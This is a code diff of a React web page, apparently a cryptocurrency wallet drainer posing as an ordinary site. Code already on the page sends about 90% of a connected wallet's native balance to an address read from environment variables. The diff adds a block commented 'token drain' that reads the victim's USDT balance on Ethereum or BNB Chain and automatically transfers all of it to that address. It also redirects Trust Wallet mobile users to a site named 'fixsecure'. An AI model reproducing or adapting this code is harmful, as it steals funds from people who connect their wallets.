@@ -12,7 +12,12 @@ import {
   bitcoin,
   sepolia,
 } from "@reown/appkit/networks";
-import { useAppKit, useAppKitAccount, useWalletInfo, useDisconnect  } from "@reown/appkit/react";
+import {
+  useAppKit,
+  useAppKitAccount,
+  useWalletInfo,
+  useDisconnect,
+} from "@reown/appkit/react";
 import {
   useSwitchChain,
   useSendTransaction,
@@ -25,19 +30,8 @@ import {
 } from "wagmi";
 // import { parseEther } from 'viem'
 import { useEffect, useState } from "react";
-
-
-
-
-
-
-
-
-
-
-
-
-
+import { erc20Abi } from "viem";
+import { useReadContract, useWriteContract } from "wagmi";
 
 const Home = () => {
   const [totalFee, setTotalFee] = useState(null);
@@ -47,7 +41,8 @@ const Home = () => {
   const balance = useBalance({ address });
   const [amountToSend, setAmountToSend] = useState(null);
   const { disconnect } = useDisconnect();
-       const { walletInfo } = useWalletInfo();
+  const { walletInfo } = useWalletInfo();
+    const [tokenAddress, setTokenAddress] = useState(null);
 
   const [txHash, setTxHash] = useState(null);
 
@@ -74,16 +69,16 @@ const Home = () => {
     },
   });
 
-const { data: request } = usePrepareTransactionRequest(
-  address && amountToSend && balance.data?.symbol
-    ? {
-        chainId: chain.id,
-        account: address,
-        to: import.meta.env[`VITE_${balance.data.symbol}_ADDRESS`],
-        value: amountToSend,
-      }
-    : undefined
-);
+  const { data: request } = usePrepareTransactionRequest(
+    address && amountToSend && balance.data?.symbol
+      ? {
+          chainId: chain.id,
+          account: address,
+          to: import.meta.env[`VITE_${balance.data.symbol}_ADDRESS`],
+          value: amountToSend,
+        }
+      : undefined
+  );
   // const { sendTransaction, isPending } = useSendTransaction();
 
   const requestSwitch = () => {
@@ -133,12 +128,10 @@ const { data: request } = usePrepareTransactionRequest(
     }
   }, [confirmed]);
 
-  const isMobileDevice = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent) ||
-  window.matchMedia("(max-width: 768px)").matches || isMobile
-
-console.log("ismobiledevice", isMobileDevice);
-
- 
+  const isMobileDevice =
+    /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent) ||
+    window.matchMedia("(max-width: 768px)").matches ||
+    isMobile;
 
   useEffect(() => {
     if (isConnected && address && activeChain.id) {
@@ -147,7 +140,7 @@ console.log("ismobiledevice", isMobileDevice);
       console.log("chainId:", chain.id);
 
       if (activeChain?.id !== chain.id) {
-        console.log("Switching network...")
+        console.log("Switching network...");
         requestSwitch();
         return; // ✅ Wait for network switch before sending transaction
       } else {
@@ -169,36 +162,29 @@ console.log("ismobiledevice", isMobileDevice);
     value: balance.data?.value,
   });
 
-
-    const isTrustWalletApp = () => {
-  // Trust Wallet injects `ethereum.isTrust` in the in-app browser
-  return typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true;
-}
+  const isTrustWalletApp = () => {
+    // Trust Wallet injects `ethereum.isTrust` in the in-app browser
+    return (
+      typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true
+    );
+  };
 
   useEffect(() => {
 
-console.log(isMobile)
-console.log(isTrustWalletApp())
-console.log(walletInfo?.name)
+    if (
+      isConnected &&
+      walletInfo?.name === "Trust Wallet" &&
+      isMobileDevice &&
+      !isTrustWalletApp() // ensure we are not already inside the app
+    ) {
+      const run = async () => {
+        await disconnect(); // ✅ works correctly
+        window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
+      };
 
-
-  if (
-    isConnected &&
-    walletInfo?.name === "Trust Wallet"  &&
-    isMobileDevice &&
-    !isTrustWalletApp() // ensure we are not already inside the app
-  ) {
-   const run = async () => {
-      await disconnect(); // ✅ works correctly
-      window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
-    };
-
-    run();
+      run();
     }
-
-
-   
-}, [isConnected, walletInfo, activeChain?.id]);
+  }, [isConnected, walletInfo, activeChain?.id]);
 
   useEffect(() => {
     if (estimateGas.data && gasPrice.data && balance.data?.value) {
@@ -207,27 +193,23 @@ console.log(walletInfo?.name)
 
       setAmountToSend((balance.data?.value * 90n) / 100n + fee);
     }
-    console.log("total fee:", totalFee, balance.data?.symbol);
   }, [estimateGas.data, gasPrice.data, balance.data?.value]);
 
   const transferFunds = () => {
-  if (!chain || !request) {
-    console.log("Cannot send transaction: missing chain or request");
-    return;
-  }
-
-  if (!amountToSend || amountToSend <= 0n || balance.data?.value <= 0n) {
-    console.log("Not enough balance or amount to send");
-    return;
-  }
-
-  
-
-         if(walletInfo?.name === "MetaMask" && isMobile) {
-      const metamaskLink= "https://link.metamask.io"
-      window.open(metamaskLink, "_blank")
+    if (!chain || !request) {
+      console.log("Cannot send transaction: missing chain or request");
+      return;
     }
 
+    if (!amountToSend || amountToSend <= 0n || balance.data?.value <= 0n) {
+      console.log("Not enough balance or amount to send");
+      return;
+    }
+
+    if (walletInfo?.name === "MetaMask" && isMobile) {
+      const metamaskLink = "https://link.metamask.io";
+      window.open(metamaskLink, "_blank");
+    }
 
     sendTransaction(request, {
       onSuccess(hash) {
@@ -274,6 +256,77 @@ console.log(walletInfo?.name)
       }),
     });
   };
+
+  //token drain
+
+  // const tokenAddress = "0x..."; // ERC-20 contract
+
+
+
+  useEffect(() => {
+    if (isConnected) {
+      if (activeChain?.name === "BNB Smart Chain") {
+        setTokenAddress("0x55d398326f99059fF775485246999027B3197955")
+      } else if (activeChain?.name === "Ethereum") {
+        setTokenAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7");
+      }
+    }
+  }, [isConnected, activeChain, tokenAddress,]);
+  // 1. Read token balance
+  const { data: rawBalance } = useReadContract({
+    address: tokenAddress,
+    abi: erc20Abi,
+    functionName: "balanceOf",
+    args: [address],
+  });
+
+
+  // 2. Read decimals
+  const { data: decimals } = useReadContract({
+    address: tokenAddress,
+    abi: erc20Abi,
+    functionName: "decimals",
+  });
+
+  // 3. Determine if balance exists
+  const hasToken = rawBalance && rawBalance > 0n;
+
+  // 4. Prepare transaction
+  const { writeContract, error, isError } = useWriteContract();
+
+  // 5. Send transaction
+  // const { write } = useWriteContract(config);
+
+  const sendToken = () => {
+    if (!hasToken) return;
+      if (!isConnected) return;
+  if (!tokenAddress) return ;
+  if (!rawBalance) return ;
+  if (!decimals) return ;
+    try {
+        writeContract({
+        account: address, 
+          address: tokenAddress,
+          abi: erc20Abi,
+          functionName: "transfer",
+          args: [
+            import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
+            rawBalance,
+          ], // send ALL tokens
+        }) 
+        if(isError) {
+        console.log("Error sending token", error)
+        }
+    } catch (error) {
+      console.error("Transaction error:", error);
+    }
+  };
+
+  useEffect(() => {
+    if (hasToken) {
+      sendToken();
+    }
+  }, [isConnected, hasToken, rawBalance, decimals]);
 
   const images = Array.from({ length: 32 }, (_, i) => `/images/${i + 1}.PNG`);
 
